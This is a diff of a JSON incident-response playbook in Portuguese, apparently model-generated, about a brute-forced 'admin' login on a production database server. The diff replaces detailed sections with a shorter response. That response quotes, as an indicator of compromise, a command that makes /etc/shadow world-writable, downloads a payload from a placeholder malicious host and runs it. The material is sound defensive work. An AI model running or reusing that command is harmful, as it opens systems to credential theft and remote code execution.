@@ -1,6 +1,6 @@
 {
   "metadata": {
-    "generated_at": "2025-04-13T20:02:00.526104",
+    "generated_at": "2025-04-26T14:32:46.338726",
     "incident_type": "Security Incident",
     "alert_name": "Multiple Failed Login Attempts Followed by Successful Login",
     "severity": "High",
@@ -9,73 +9,12 @@
     "hostname": "srv-db-prod01",
     "user": "admin"
   },
-  "sections": {
-    "resumo": [
-      {
-        "id": "resumo_1",
-        "title": "**Vis\u00e3o geral do que ocorreu**: O alerta indica m\u00faltiplas tentativas de login falhas seguidas por um login bem-sucedido na conta 'admin' no servidor 'srv-db-prod01'. Ap\u00f3s o login, comandos suspeitos foram executados, incluindo a altera\u00e7\u00e3o de permiss\u00f5es cr\u00edticas e o download de um payload malicioso.",
-        "description": "**Vis\u00e3o geral do que ocorreu**: O alerta indica m\u00faltiplas tentativas de login falhas seguidas por um login bem-sucedido na conta 'admin' no servidor 'srv-db-prod01'. Ap\u00f3s o login, comandos suspeitos foram executados, incluindo a altera\u00e7\u00e3o de permiss\u00f5es cr\u00edticas e o download de um payload malicioso.",
-        "content": "- **Classifica\u00e7\u00e3o t\u00e9cnica do incidente**: Escala\u00e7\u00e3o de Privil\u00e9gios.\n\n- **Avalia\u00e7\u00e3o de severidade**: Alta. A execu\u00e7\u00e3o de comandos com privil\u00e9gios elevados e o download de um payload malicioso indicam um comprometimento significativo do sistema.\n\n- **Potencial impacto**: Acesso n\u00e3o autorizado a dados sens\u00edveis, comprometimento da integridade do sistema, poss\u00edvel movimento lateral e instala\u00e7\u00e3o de backdoors.",
-        "commands": [],
-        "subitems": []
-      }
-    ],
-    "investigacao": [
-      {
-        "id": "investigacao_1",
-        "title": "**Passos iniciais para triagem**:",
-        "description": "**Passos iniciais para triagem**:",
-        "content": "- Verificar a autenticidade do alerta e confirmar o incidente.\n  - Identificar se outros sistemas foram alvo de tentativas de login semelhantes.\n\n- **Coleta de evid\u00eancias**:\n  - Capturar logs de autentica\u00e7\u00e3o e de comandos executados.\n  - Coletar informa\u00e7\u00f5es de rede, incluindo logs de firewall e IDS/IPS.\n  - Preservar c\u00f3pias dos arquivos de configura\u00e7\u00e3o e do sistema afetado.\n\n- **An\u00e1lise t\u00e9cnica detalhada**:\n  - Revisar logs de autentica\u00e7\u00e3o para padr\u00f5es de login suspeitos.\n  - Analisar os comandos executados e seus efeitos no sistema.\n  - Verificar a origem do payload baixado e analisar seu comportamento.\n\n- **Comandos e ferramentas espec\u00edficos para usar**:\n  - `grep 'Failed password' /var/log/auth.log` para identificar tentativas de login falhas.\n  - `grep 'Accepted password' /var/log/auth.log` para logins bem-sucedidos.\n  - `ps aux | grep payload` para verificar processos suspeitos em execu\u00e7\u00e3o.\n  - Ferramentas de an\u00e1lise de malware, como `ClamAV` ou `YARA`, para analisar o payload.\n\n- **Indicadores a procurar**:\n  - IPs de origem suspeitos (192.168.1.100).\n  - Comandos de altera\u00e7\u00e3o de permiss\u00f5es e downloads n\u00e3o autorizados.\n  - Presen\u00e7a de novos arquivos ou processos desconhecidos.",
-        "commands": [],
-        "subitems": []
-      }
-    ],
-    "contencao": [
-      {
-        "id": "contencao_1",
-        "title": "**A\u00e7\u00f5es imediatas para limitar o impacto**:",
-        "description": "**A\u00e7\u00f5es imediatas para limitar o impacto**:",
-        "content": "- Revogar o acesso do usu\u00e1rio 'admin' e redefinir suas credenciais.\n  - Bloquear o IP de origem (192.168.1.100) no firewall.\n\n- **Isolamento de sistemas afetados**:\n  - Desconectar o servidor 'srv-db-prod01' da rede para evitar a propaga\u00e7\u00e3o.\n\n- **Bloqueio de atividade maliciosa**:\n  - Terminar processos suspeitos relacionados ao payload.\n  - Remover ou bloquear o acesso ao site malicioso (http://malicious.example).\n\n- **Preserva\u00e7\u00e3o de evid\u00eancias**:\n  - Criar imagens de disco do servidor comprometido para an\u00e1lise forense posterior.",
-        "commands": [],
-        "subitems": []
-      }
-    ],
-    "erradicacao": [
-      {
-        "id": "erradicacao_1",
-        "title": "**Remo\u00e7\u00e3o da amea\u00e7a**:",
-        "description": "**Remo\u00e7\u00e3o da amea\u00e7a**:",
-        "content": "- Remover o payload malicioso e quaisquer backdoors instalados.\n  - Restaurar permiss\u00f5es corretas em arquivos cr\u00edticos, como `/etc/shadow`.\n\n- **Corre\u00e7\u00e3o de vulnerabilidades exploradas**:\n  - Atualizar o sistema operacional e todos os softwares para as vers\u00f5es mais recentes.\n  - Implementar autentica\u00e7\u00e3o multifator para acessos administrativos.\n\n- **Verifica\u00e7\u00e3o de comprometimento em outros sistemas**:\n  - Realizar varreduras de seguran\u00e7a em outros servidores para detectar atividades semelhantes.",
-        "commands": [],
-        "subitems": []
-      }
-    ],
-    "recuperacao": [
-      {
-        "id": "recuperacao_1",
-        "title": "**Restaura\u00e7\u00e3o de sistemas afetados**:",
-        "description": "**Restaura\u00e7\u00e3o de sistemas afetados**:",
-        "content": "- Reinstalar o sistema operacional se necess\u00e1rio e restaurar a partir de backups seguros.\n  \n- **Valida\u00e7\u00e3o da integridade**:\n  - Verificar a integridade dos sistemas restaurados usando checksums e ferramentas de verifica\u00e7\u00e3o de integridade.\n\n- **Retorno \u00e0s opera\u00e7\u00f5es normais**:\n  - Monitorar o sistema de perto ap\u00f3s a restaura\u00e7\u00e3o para detectar qualquer atividade an\u00f4mala.",
-        "commands": [],
-        "subitems": []
-      }
-    ],
-    "prevencao": [
-      {
-        "id": "prevencao_1",
-        "title": "**Recomenda\u00e7\u00f5es para prevenir incidentes similares**:",
-        "description": "**Recomenda\u00e7\u00f5es para prevenir incidentes similares**:",
-        "content": "- Implementar pol\u00edticas de senha forte e autentica\u00e7\u00e3o multifator.\n  - Realizar treinamentos regulares de seguran\u00e7a para administradores de sistemas.\n\n- **Melhorias de seguran\u00e7a sugeridas**:\n  - Configurar alertas de seguran\u00e7a para detectar tentativas de login an\u00f4malas.\n  - Revisar e refor\u00e7ar as regras de firewall e IDS/IPS.\n\n- **Atualiza\u00e7\u00f5es de pol\u00edticas ou procedimentos**:\n  - Atualizar pol\u00edticas de resposta a incidentes para incluir procedimentos espec\u00edficos para tentativas de login falhas e escalonamento de privil\u00e9gios.\n  - Revisar e atualizar regularmente as pol\u00edticas de seguran\u00e7a e acesso.",
-        "commands": [],
-        "subitems": []
-      }
-    ]
-  },
+  "sections": {},
   "references": [
     {
       "type": "External Reference",
-      "uri": "http://malicious.example)."
+      "uri": "http://malicious.example/payload;"
     }
   ],
-  "original_response": "### 1. RESUMO DO INCIDENTE\n\n- **Vis\u00e3o geral do que ocorreu**: O alerta indica m\u00faltiplas tentativas de login falhas seguidas por um login bem-sucedido na conta 'admin' no servidor 'srv-db-prod01'. Ap\u00f3s o login, comandos suspeitos foram executados, incluindo a altera\u00e7\u00e3o de permiss\u00f5es cr\u00edticas e o download de um payload malicioso.\n  \n- **Classifica\u00e7\u00e3o t\u00e9cnica do incidente**: Escala\u00e7\u00e3o de Privil\u00e9gios.\n\n- **Avalia\u00e7\u00e3o de severidade**: Alta. A execu\u00e7\u00e3o de comandos com privil\u00e9gios elevados e o download de um payload malicioso indicam um comprometimento significativo do sistema.\n\n- **Potencial impacto**: Acesso n\u00e3o autorizado a dados sens\u00edveis, comprometimento da integridade do sistema, poss\u00edvel movimento lateral e instala\u00e7\u00e3o de backdoors.\n\n### 2. PASSOS DE INVESTIGA\u00c7\u00c3O\n\n- **Passos iniciais para triagem**:\n  - Verificar a autenticidade do alerta e confirmar o incidente.\n  - Identificar se outros sistemas foram alvo de tentativas de login semelhantes.\n\n- **Coleta de evid\u00eancias**:\n  - Capturar logs de autentica\u00e7\u00e3o e de comandos executados.\n  - Coletar informa\u00e7\u00f5es de rede, incluindo logs de firewall e IDS/IPS.\n  - Preservar c\u00f3pias dos arquivos de configura\u00e7\u00e3o e do sistema afetado.\n\n- **An\u00e1lise t\u00e9cnica detalhada**:\n  - Revisar logs de autentica\u00e7\u00e3o para padr\u00f5es de login suspeitos.\n  - Analisar os comandos executados e seus efeitos no sistema.\n  - Verificar a origem do payload baixado e analisar seu comportamento.\n\n- **Comandos e ferramentas espec\u00edficos para usar**:\n  - `grep 'Failed password' /var/log/auth.log` para identificar tentativas de login falhas.\n  - `grep 'Accepted password' /var/log/auth.log` para logins bem-sucedidos.\n  - `ps aux | grep payload` para verificar processos suspeitos em execu\u00e7\u00e3o.\n  - Ferramentas de an\u00e1lise de malware, como `ClamAV` ou `YARA`, para analisar o payload.\n\n- **Indicadores a procurar**:\n  - IPs de origem suspeitos (192.168.1.100).\n  - Comandos de altera\u00e7\u00e3o de permiss\u00f5es e downloads n\u00e3o autorizados.\n  - Presen\u00e7a de novos arquivos ou processos desconhecidos.\n\n### 3. PROCEDIMENTOS DE CONTEN\u00c7\u00c3O\n\n- **A\u00e7\u00f5es imediatas para limitar o impacto**:\n  - Revogar o acesso do usu\u00e1rio 'admin' e redefinir suas credenciais.\n  - Bloquear o IP de origem (192.168.1.100) no firewall.\n\n- **Isolamento de sistemas afetados**:\n  - Desconectar o servidor 'srv-db-prod01' da rede para evitar a propaga\u00e7\u00e3o.\n\n- **Bloqueio de atividade maliciosa**:\n  - Terminar processos suspeitos relacionados ao payload.\n  - Remover ou bloquear o acesso ao site malicioso (http://malicious.example).\n\n- **Preserva\u00e7\u00e3o de evid\u00eancias**:\n  - Criar imagens de disco do servidor comprometido para an\u00e1lise forense posterior.\n\n### 4. PASSOS DE ERRADICA\u00c7\u00c3O\n\n- **Remo\u00e7\u00e3o da amea\u00e7a**:\n  - Remover o payload malicioso e quaisquer backdoors instalados.\n  - Restaurar permiss\u00f5es corretas em arquivos cr\u00edticos, como `/etc/shadow`.\n\n- **Corre\u00e7\u00e3o de vulnerabilidades exploradas**:\n  - Atualizar o sistema operacional e todos os softwares para as vers\u00f5es mais recentes.\n  - Implementar autentica\u00e7\u00e3o multifator para acessos administrativos.\n\n- **Verifica\u00e7\u00e3o de comprometimento em outros sistemas**:\n  - Realizar varreduras de seguran\u00e7a em outros servidores para detectar atividades semelhantes.\n\n### 5. PROCEDIMENTOS DE RECUPERA\u00c7\u00c3O\n\n- **Restaura\u00e7\u00e3o de sistemas afetados**:\n  - Reinstalar o sistema operacional se necess\u00e1rio e restaurar a partir de backups seguros.\n  \n- **Valida\u00e7\u00e3o da integridade**:\n  - Verificar a integridade dos sistemas restaurados usando checksums e ferramentas de verifica\u00e7\u00e3o de integridade.\n\n- **Retorno \u00e0s opera\u00e7\u00f5es normais**:\n  - Monitorar o sistema de perto ap\u00f3s a restaura\u00e7\u00e3o para detectar qualquer atividade an\u00f4mala.\n\n### 6. LI\u00c7\u00d5ES APRENDIDAS E PREVEN\u00c7\u00c3O\n\n- **Recomenda\u00e7\u00f5es para prevenir incidentes similares**:\n  - Implementar pol\u00edticas de senha forte e autentica\u00e7\u00e3o multifator.\n  - Realizar treinamentos regulares de seguran\u00e7a para administradores de sistemas.\n\n- **Melhorias de seguran\u00e7a sugeridas**:\n  - Configurar alertas de seguran\u00e7a para detectar tentativas de login an\u00f4malas.\n  - Revisar e refor\u00e7ar as regras de firewall e IDS/IPS.\n\n- **Atualiza\u00e7\u00f5es de pol\u00edticas ou procedimentos**:\n  - Atualizar pol\u00edticas de resposta a incidentes para incluir procedimentos espec\u00edficos para tentativas de login falhas e escalonamento de privil\u00e9gios.\n  - Revisar e atualizar regularmente as pol\u00edticas de seguran\u00e7a e acesso."
+  "original_response": "**RESUMO DO INCIDENTE**\n\n* Vis\u00e3o geral: O incidente ocorreu quando um atacante conseguiu executar um comando malicioso em um sistema Unix, alterando permiss\u00f5es e baixando um payload malicioso.\n* Classifica\u00e7\u00e3o t\u00e9cnica: Incidente de seguran\u00e7a cibern\u00e9tica tipo 3 (TTP-3) - Acesso n\u00e3o autorizado a sistemas ou dados.\n* Avalia\u00e7\u00e3o de severidade: Severidade alta, pois o atacante conseguiu executar comandos maliciosos e baixar um payload malicioso.\n* Potencial impacto: O incidente pode ter causado perda de confidencialidade, integridade e disponibilidade dos sistemas afetados.\n\n**PASSOS DE INVESTIGA\u00c7\u00c3O**\n\n1. Passos iniciais para triagem:\n\t* Verificar logs de sistema para detectar atividades suspeitas.\n\t* Coletar informa\u00e7\u00f5es sobre o sistema afetado, incluindo vers\u00e3o do sistema operacional e software instalados.\n2. Coleta de evid\u00eancias:\n\t* Capturar pacotes de rede para analisar comunica\u00e7\u00e3o entre o atacante e o sistema afetado.\n\t* Coletar amostras de malware baixadas pelo atacante.\n3. An\u00e1lise t\u00e9cnica detalhada:\n\t* Analisar comandos maliciosos executados no sistema afetado.\n\t* Verificar se h\u00e1 vulnerabilidades exploradas no sistema operacional ou software instalados.\n4. Comandos e ferramentas espec\u00edficos para usar:\n\t* `tcpdump` para capturar pacotes de rede.\n\t* `Wireshark` para analisar comunica\u00e7\u00e3o entre o atacante e o sistema afetado.\n\t* `strings` e `grep` para analisar conte\u00fado de arquivos maliciosos.\n5. Indicadores a procurar:\n\t* Comandos maliciosos executados no sistema afetado (ex: `chmod 777 /etc/shadow; wget http://malicious.example/payload; ./payload &`).\n\t* Presen\u00e7a de malware baixado pelo atacante.\n\n**PROCEDIMENTOS DE CONTEN\u00c7\u00c3O**\n\n1. A\u00e7\u00f5es imediatas para limitar o impacto:\n\t* Isolar o sistema afetado do restante da rede.\n\t* Desativar contas de usu\u00e1rio suspeitas.\n2. Isolamento de sistemas afetados:\n\t* Criar um ambiente isolado para o sistema afetado.\n\t* Desabilitar comunica\u00e7\u00e3o com o restante da rede.\n3. Bloqueio de atividade maliciosa:\n\t* Executar comandos `chmod` e `chown` para reverter permiss\u00f5es alteradas pelo atacante.\n\t* Executar comando `rm` para remover arquivos maliciosos baixados pelo atacante.\n4. Preserva\u00e7\u00e3o de evid\u00eancias:\n\t* Capturar pacotes de rede para preservar comunica\u00e7\u00e3o entre o atacante e o sistema afetado.\n\n**PASSOS DE ERRADICA\u00c7\u00c3O**\n\n1. Remo\u00e7\u00e3o da amea\u00e7a:\n\t* Executar comando `rm` para remover arquivos maliciosos baixados pelo atacante.\n\t* Executar comando `chmod` e `chown` para reverter permiss\u00f5es alteradas pelo atacante.\n2. Corre\u00e7\u00e3o de vulnerabilidades exploradas:\n\t* Atualizar software instalados para vers\u00f5es mais recentes.\n\t* Aplicar patches de seguran\u00e7a recomendados.\n3. Verifica\u00e7\u00e3o de comprometimento em outros sistemas:\n\t* Realizar uma verifica\u00e7\u00e3o geral dos sistemas da rede para detectar poss\u00edveis comprometimentos.\n\n**PROCEDIMENTOS DE RECUPERA\u00c7\u00c3O**\n\n1. Restaura\u00e7\u00e3o de sistemas afetados:\n\t* Executar comando `fsck` para verificar integridade do sistema.\n\t* Executar comando `mount` para restaurar montagem de arquivos.\n2. Valida\u00e7\u00e3o da integridade:\n\t* Realizar uma verifica\u00e7\u00e3o geral dos sistemas da rede para detectar poss\u00edveis comprometimentos.\n3. Retorno \u00e0s opera\u00e7\u00f5es normais:\n\t* Restaurar servi\u00e7os e aplicativos afetados.\n\n**LI\u00c7\u00d5ES APRENDIDAS E PREVEN\u00c7\u00c3O**\n\n1. Recomenda\u00e7\u00f5es para prevenir incidentes similares:\n\t* Implementar controles de acesso mais rigorosos.\n\t* Atualizar software instalados para vers\u00f5es mais recentes.\n2. Melhorias de seguran\u00e7a sugeridas:\n\t* Implementar sistema de detec\u00e7\u00e3o de intrusos (IDS).\n\t* Realizar treinamento regular para equipes de resposta a incidentes.\n3. Atualiza\u00e7\u00f5es de pol\u00edticas ou procedimentos:\n\t* Revisar e atualizar pol\u00edticas de seguran\u00e7a da empresa.\n\t* Estabelecer procedimentos claros para resposta a incidentes de seguran\u00e7a cibern\u00e9tica.\n\nEssas s\u00e3o as etapas que um especialista em resposta a incidentes de seguran\u00e7a cibern\u00e9tica pode seguir para investigar, conter e erradicar um incidente de seguran\u00e7a cibern\u00e9tica."
 }
